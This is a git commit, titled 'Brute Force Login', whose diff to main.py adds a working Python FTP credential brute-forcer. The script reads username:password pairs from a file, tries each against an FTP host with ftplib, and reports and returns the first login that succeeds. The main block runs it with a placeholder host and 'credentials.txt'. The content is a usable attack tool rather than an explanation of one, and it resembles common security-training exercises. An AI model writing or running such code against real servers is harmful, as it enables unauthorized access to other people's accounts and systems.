3983a27592707149fac6f6dff2284abd1ea73b1b
Manvir Mann <manvirm29@gmail.com>
2023-03-25 23:10:29 -0700

    Brute Force Login

--- main.py
+++ main.py
@@ -1,2 +1,20 @@
+import ftplib
+
+def bruteForceLogin(hostname, passwordFile):
+    passList = open(passwordFile, 'r')
+    for line in passList.readlines():
+        userName = line.split(':')[0]
+        passWord = line.split(':')[1].strip('\r').strip('\n')
+        print(f"Trying: {userName}/{passWord}")
+        try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(userName, passWord)
+            print(f"FTP Login succeeded: {userName} + {passWord}")
+            ftp.quit()
+            return (userName, passWord)
+        except Exception:
+            pass
 if __name__ == '__main__':
-    
+    hostName = "123"
+    passwordFile = 'credentials.txt'
+    bruteForceLogin(hostName, passwordFile)
